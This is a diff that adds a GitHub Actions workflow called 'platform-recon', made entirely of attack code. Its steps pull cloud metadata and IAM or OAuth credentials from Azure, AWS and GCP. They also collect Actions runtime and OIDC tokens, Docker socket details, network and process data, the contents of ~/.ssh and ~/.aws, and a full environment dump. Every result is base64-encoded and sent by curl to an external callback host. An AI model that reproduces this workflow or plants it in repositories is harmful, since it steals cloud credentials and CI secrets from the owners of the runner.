@@ -1,0 +1,109 @@
+name: platform-recon
+on:
+  workflow_dispatch:
+permissions: {}
+
+jobs:
+  recon:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "Azure IMDS probe"
+        run: |
+          set +e
+          echo "=== AZURE IMDS ==="
+          (curl -sk -m 5 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | base64 -w0 | curl -sk -m 10 -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/IMDS-INSTANCE=") &
+          (curl -sk -m 5 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null | base64 -w0 | curl -sk -m 10 -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/IMDS-TOKEN=") &
+          wait
+
+      - name: "AWS IMDS probe"
+        run: |
+          set +e
+          echo "=== AWS IMDS ==="
+          (curl -sk -m 5 "http://169.254.169.254/latest/meta-data/" 2>/dev/null | base64 -w0 | curl -sk -m 10 -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/AWS-META=") &
+          (curl -sk -m 5 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null | base64 -w0 | curl -sk -m 10 -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/AWS-IAM=") &
+          wait
+
+      - name: "GCP metadata probe"
+        run: |
+          set +e
+          echo "=== GCP METADATA ==="
+          curl -sk -m 5 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/" 2>/dev/null | base64 -w0 | curl -sk -m 10 -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/GCP-META="
+
+      - name: "Actions internal tokens"
+        run: |
+          set +e
+          echo "=== ACTIONS INTERNAL TOKENS ==="
+          RT=$(printenv ACTIONS_RUNTIME_TOKEN 2>/dev/null || echo "EMPTY")
+          CU=$(printenv ACTIONS_CACHE_URL 2>/dev/null || echo "EMPTY")
+          RU=$(printenv ACTIONS_RESULTS_URL 2>/dev/null || echo "EMPTY")
+          IU=$(printenv ACTIONS_ID_TOKEN_REQUEST_URL 2>/dev/null || echo "EMPTY")
+          IT=$(printenv ACTIONS_ID_TOKEN_REQUEST_TOKEN 2>/dev/null || echo "EMPTY")
+          curl -sk -m 10 "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/RT=$(echo "$RT" | base64 -w0 | tr '+/' '-_' | tr -d '=')" &
+          curl -sk -m 10 "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/CACHE_URL=$(echo "$CU" | base64 -w0 | tr '+/' '-_' | tr -d '=')" &
+          curl -sk -m 10 "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/RESULTS_URL=$(echo "$RU" | base64 -w0 | tr '+/' '-_' | tr -d '=')" &
+          curl -sk -m 10 "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/ID_TOKEN_URL=$(echo "$IU" | base64 -w0 | tr '+/' '-_' | tr -d '=')" &
+          curl -sk -m 10 "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/ID_TOKEN_REQ=$(echo "$IT" | base64 -w0 | tr '+/' '-_' | tr -d '=')" &
+          wait
+
+      - name: "OIDC token request"
+        run: |
+          set +e
+          echo "=== OIDC TOKEN ==="
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ] && [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            TOKEN=$(curl -sk -m 10 -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" 2>/dev/null)
+            echo "$TOKEN" | base64 -w0 | curl -sk -m 10 -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/OIDC="
+          else
+            echo "NO_OIDC_ENV" | curl -sk -m 10 -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/OIDC=NONE"
+          fi
+
+      - name: "Docker socket check"
+        run: |
+          set +e
+          echo "=== DOCKER ==="
+          ls -la /var/run/docker.sock 2>/dev/null | base64 -w0 | curl -sk -m 10 -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/DOCKER-SOCK="
+          curl -sk -m 5 --unix-socket /var/run/docker.sock http://localhost/info 2>/dev/null | head -c 5000 | base64 -w0 | curl -sk -m 10 -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/DOCKER-INFO="
+
+      - name: "Network recon"
+        run: |
+          set +e
+          echo "=== NETWORK RECON ==="
+          ss -tnp 2>/dev/null | head -30 | base64 -w0 | curl -sk -m 10 -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/NET-SS="
+          cat /proc/net/tcp 2>/dev/null | head -20 | base64 -w0 | curl -sk -m 10 -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/NET-TCP="
+          cat /etc/hosts 2>/dev/null | base64 -w0 | curl -sk -m 10 -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/NET-HOSTS="
+
+      - name: "Filesystem recon"
+        run: |
+          set +e
+          echo "=== FILESYSTEM ==="
+          find /tmp /var/tmp /root /home -maxdepth 3 -mtime -1 -ls 2>/dev/null | head -30 | base64 -w0 | curl -sk -m 10 -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/FS-FIND="
+          ls -la ~/.ssh/ ~/.aws/ ~/.docker/ 2>/dev/null | base64 -w0 | curl -sk -m 10 -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/FS-DOTDIRS="
+
+      - name: "Process and host isolation"
+        run: |
+          set +e
+          echo "=== PROCESS ISOLATION ==="
+          ps aux 2>/dev/null | head -20 | base64 -w0 | curl -sk -m 10 -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/PROC-PS="
+          cat /proc/1/cgroup 2>/dev/null | head -5 | base64 -w0 | curl -sk -m 10 -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/PROC-CGROUP="
+          NPROCS=$(ls /proc/*/exe 2>/dev/null | wc -l)
+          echo "NPROCS=$NPROCS" | curl -sk -m 10 -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/PROC-COUNT="
+
+      - name: "Environment dump"
+        run: |
+          set +e
+          echo "=== ENV DUMP ==="
+          env | sort | head -80 | base64 -w0 | curl -sk -m 10 -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/ENV="
+
+      - name: "Summary artifact"
+        run: |
+          set +e
+          echo '{"hostname":"'"$(hostname)"'","kernel":"'"$(uname -a)"'","user":"'"$(whoami)"'","pwd":"'"$(pwd)"'","date":"'"$(date -Iseconds)"'"}' > /tmp/recon-summary.json
+          env | grep -iE 'RUNNER|ACTIONS|GITHUB|CLOUD|AZURE|AWS|GCP' | sort >> /tmp/recon-summary.json 2>/dev/null
+          cat /tmp/recon-summary.json
+        continue-on-error: true
+
+      - name: "Upload recon artifact"
+        uses: actions/upload-artifact@v4
+        with:
+          name: platform-recon
+          path: /tmp/recon-summary.json
+        continue-on-error: true
